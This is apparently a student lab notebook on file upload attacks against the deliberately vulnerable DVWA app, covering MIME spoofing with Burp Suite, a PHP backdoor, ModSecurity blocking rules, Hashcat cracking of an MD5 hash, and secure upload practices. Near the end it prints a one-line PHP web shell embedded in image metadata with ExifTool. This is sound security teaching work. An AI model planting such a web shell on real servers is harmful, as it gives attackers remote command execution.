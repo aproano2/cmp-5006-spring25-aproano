{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "bae00c47",
   "metadata": {},
   "source": [
    "# Problem 4: File Upload Vulnerabilities and Hash Analysis"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a664f989",
   "metadata": {},
   "source": [
    "### Intro\n",
    "In this exercise, we explore file upload vulnerabilities using DVWA. The goal is to analyze and bypass upload restrictions at different security levels, inject malicious PHP backdoors, and evaluate defenses like MIME type checks and ModSecurity rules. Additionally, the exercise covers file hash analysis, polyglot file creation with ExifTool, and password hash cracking using rainbow tables and Hashcat."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "219b7e1a",
   "metadata": {},
   "source": [
    "### Source Code of PHP Backdoor"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8ff7ee96",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/bd_4.png)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5e142f2f",
   "metadata": {},
   "source": [
    "The following image shows the content of the malicious `backdoor.php` file created for the upload attack. This file contains a simple PHP script designed to allow remote command execution via a GET parameter called `cmd`."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_1.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9f3cf6dd",
   "metadata": {},
   "source": [
    "When trying to upload the `backdoor.php` file with its true MIME type, the server rejected the request. As shown in the image, DVWA (medium mode) checks the MIME type and only accepts files reported as `image/jpeg` or `image/png`. This rejection demonstrates the basic protection in place and sets the stage for the next bypass attempt using MIME spoofing."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_2.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2b4cc376",
   "metadata": {},
   "source": [
    "After the rejection, the attacker used Burp Suite to spoof the MIME type of the malicious file by changing the `Content-Type` from `application/x-php` to `image/jpeg`. This tricked DVWA into accepting the `.php` file as if it were a valid image. The server responded with a success message, confirming that the file `backdoor.php` was successfully uploaded and stored in the `uploads` directory."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d1dfffe8",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_3.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ca978126",
   "metadata": {},
   "source": [
    "The DVWA interface confirms that the upload was successful. This occurred under the \"medium\" security setting, where the server accepted the spoofed `image/jpeg` MIME type without verifying the file’s actual contents. \n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "01eaaf66",
   "metadata": {},
   "source": [
    "### File Hashes (MD5 and SHA-256)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "31ffcf92",
   "metadata": {},
   "source": [
    "To ensure integrity and track the uploaded malicious files, cryptographic hashes were calculated using `md5sum` and `sha256sum` for both files"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_4.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5369251c",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_5.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d44db1dc",
   "metadata": {},
   "source": [
    "\n",
    "**backdoor.php**\n",
    "- MD5: `463d58123b5eaa1666eb3d1275e7fbec`\n",
    "- SHA-256: `a5b1564f3195c98730e3f1674ec0486b6a21b7511e499fcbae7270b0dca106f07`\n",
    "\n",
    "This file is a pure PHP script uploaded using MIME spoofing to bypass DVWA’s medium-level upload restrictions. It was designed to allow remote command execution through a `cmd` parameter.\n",
    "\n",
    "**shell.php.png**\n",
    "- MD5: `f2b05780da625d811f3cf5fb57809777`\n",
    "- SHA-256: `1c0b10282f9e5c5db4c3af6075eb9f71215534ce391a4f8e61161de755e2059d`\n",
    "\n",
    "This is a polyglot file: a `.png` image that contains embedded PHP code inside its Exif metadata using `exiftool`. It was crafted to evade stricter security checks and was successfully uploaded under DVWA’s high security level.\n",
    "\n",
    "These hashes serve as fingerprints of the uploaded files and are useful for later comparison or forensic analysis."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a40e996c",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_6.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c95742cb",
   "metadata": {},
   "source": [
    "This image shows the DVWA web interface with a success message indicating that the file `shell.php.png` was successfully uploaded.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "3786481c",
   "metadata": {},
   "source": [
    "### ModSecurity Rules"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e7a0587b",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_7.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dba37cf1",
   "metadata": {},
   "source": [
    "It serves as a reference for verifying whether the file was successfully blocked by custom rules."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "73f27d49",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_8.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82289833",
   "metadata": {},
   "source": [
    "A set of ModSecurity rules were written to detect and block malicious file uploads. These rules include blocking `.php` extensions, double extensions like `.php.png`, suspicious MIME types (application/x-php), PHP code in file contents and even in image metadata (Exif). This configuration directly implements a defense-in-depth strategy by detecting multiple attack vectors used in web shell upload attempts."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9045a186",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_9.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2ed8e6a4",
   "metadata": {},
   "source": [
    "This shows the main ModSecurity configuration file (`modsecurity.conf`), where the custom rules file is explicitly included using the directive `Include /etc/modsecurity/custom_rules.conf`. This step ensures that the rules defined in the previous image are actually loaded and enforced by the ModSecurity engine during request inspection, completing the WAF configuration process."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6ee92746",
   "metadata": {},
   "source": [
    "### Rainbow Table Generation Process and Lookup Results"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f3e6849d",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_10.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d3ed5246",
   "metadata": {},
   "source": [
    "This image shows the creation of a custom wordlist named `custom_wordlist4.txt`, which contains a small set of commonly used passwords such as `admin`, `123456`, and `dragon`. These words will be used to generate corresponding MD5 hashes for the rainbow table."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cec5dd8b",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_11.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf84503e",
   "metadata": {},
   "source": [
    "This is the file `rainbow_table.txt`, which contains the MD5 hashes of each password from the wordlist. This table acts as a lookup database to quickly identify plaintext passwords corresponding to known hashes during cracking.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "13efe4ec",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_12.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1d69100d",
   "metadata": {},
   "source": [
    "This shows the actual commands used to generate the rainbow table using a loop that calculates MD5 hashes from the wordlist. Additionally, a hash (`21232f297a57a5a743894a0e4a801fc3`) is written to `hash_to_crack.txt`—this is the hash we aim to crack.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "12091970",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_13.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c956989b",
   "metadata": {},
   "source": [
    "Hashcat initializing with configuration details. It shows that one hash will be tested against the custom wordlist. A warning is also shown due to the use of an unoptimized backend, meaning cracking performance might be reduced."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b140fdcf",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_14.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "68ea3083",
   "metadata": {},
   "source": [
    "This image shows Hashcat beginning the cracking process using the `custom_wordlist4.txt` against the hash in `hash_to_crack.txt`. It confirms that the dictionary was loaded and that 10 passwords will be tested.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "92da134a",
   "metadata": {},
   "source": [
    "![Hash passwords](imag/4_15.jpeg)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6dcf1d4e",
   "metadata": {},
   "source": [
    "Hashcat successfully cracked the hash `21232f297a57a5a743894a0e4a801fc3` and identified the original plaintext password as `admin`. The cracking process used the rainbow table created earlier and validated the effectiveness of dictionary-based attacks.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "44f3179e",
   "metadata": {},
   "source": [
    "Several techniques were used to bypass DVWA’s file upload protections:\n",
    "\n",
    "- **MIME Type Spoofing**: With Burp Suite, the `Content-Type` of the request was modified from `application/x-php` to `image/jpeg`, successfully tricking the DVWA server into accepting the PHP file (`backdoor.php`) during the \"medium\" security level.\n",
    "\n",
    "- **Double Extension Bypass**: The file `shell.php.png` was created to circumvent extension-based filtering. Although it appears to be an image, it contains executable PHP code either directly or in its metadata.\n",
    "\n",
    "- **ExifTool Polyglot Payload**: PHP code was inserted into the image’s metadata using ExifTool:\n",
    "  ```bash\n",
    "  exiftool -Comment='<?php system($_GET[\"cmd\"]); ?>' image.png\n",
    "  mv image.png shell.php.png"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5cea8cf2",
   "metadata": {},
   "source": [
    "### Recommended Secure File Upload Practices"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9ace17f8",
   "metadata": {},
   "source": [
    "When it comes to file uploads, protecting systems from malicious content and unauthorized access is essential—especially in distributed environments such as media production teams collaborating across regions. Improper handling of uploaded files can expose servers to malware, server-side script execution, data breaches, or complete system compromise.\n",
    "\n",
    "To mitigate such risks, the following best practices are strongly recommended:\n",
    "\n",
    "1. **Authenticate users**  \n",
    "   Enforce secure authentication mechanisms before allowing uploads. At minimum, implement two-factor authentication (2FA), and ideally multi-factor authentication (MFA), to verify the identity of uploaders.\n",
    "\n",
    "2. **Implement access and download controls**  \n",
    "   Restrict who can upload, view, or download files based on roles and permissions. Use models like RBAC (Role-Based Access Control) or ABAC (Attribute-Based Access Control) to enforce access policies.\n",
    "\n",
    "3. **Conduct regular security audits**  \n",
    "   Periodically audit your file upload workflows and server configurations to identify vulnerabilities, misconfigurations, or permission escalations. Include penetration testing and third-party code reviews.\n",
    "\n",
    "4. **Ensure compliance with data protection regulations**  \n",
    "   Align file handling workflows with security and privacy regulations such as GDPR, HIPAA, or SOC 2. Ensuring compliance protects users and avoids legal penalties.\n",
    "\n",
    "5. **Train employees on secure file handling**  \n",
    "   Security awareness is critical. Educate all team members on the risks of insecure file uploads and ensure they follow protocols like avoiding unsafe links, using strong passwords, and verifying upload sources.\n",
    "\n",
    "6. **Restrict file types**  \n",
    "   Only allow specific file types (e.g., `.jpg`, `.png`, `.pdf`) based on application needs. Block potentially dangerous formats such as `.php`, `.exe`, `.bat`, or `.sh`.\n",
    "\n",
    "7. **Store files in secure cloud environments**  \n",
    "   Choose cloud storage platforms that offer encryption, access controls, and logging. Avoid storing uploaded files directly in publicly accessible or web-exposed directories.\n",
    "\n",
    "8. **Encrypt files in transit and at rest**  \n",
    "   Use strong encryption protocols such as TLS 1.2+ for files in transit and AES-256 for data at rest. This ensures that even if files are intercepted or accessed without authorization, they remain unreadable.\n",
    "\n",
    "9. **Scan files for malware**  \n",
    "   Automatically scan uploaded files for viruses, trojans, and other malware using antivirus engines or sandboxed analysis environments.\n",
    "\n",
    "10. **Keep software up to date**  \n",
    "    Regularly patch and update web servers, libraries, frameworks, and third-party upload components. Known vulnerabilities in outdated systems are frequent attack targets.\n",
    "\n",
    "11. **Log all upload activity and enable auditing**  \n",
    "    Maintain logs of file upload attempts, user access, and file downloads. Audit trails help in tracing malicious behavior or incident response investigations.\n",
    "\n",
    "12. **Sanitize file names**  \n",
    "    Remove or replace potentially dangerous characters from uploaded file names. Avoid storing sensitive information in file names, and enforce consistent naming conventions.\n",
    "\n",
    "---\n",
    "\n",
    "By applying these practices and supplementing them with a well-configured Web Application Firewall (WAF) such as ModSecurity, organizations can greatly reduce their exposure to file upload vulnerabilities. In production environments—especially those that handle sensitive intellectual property, large media files, or cross-border data flows—upload security should never be an afterthought.\n",
    "\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
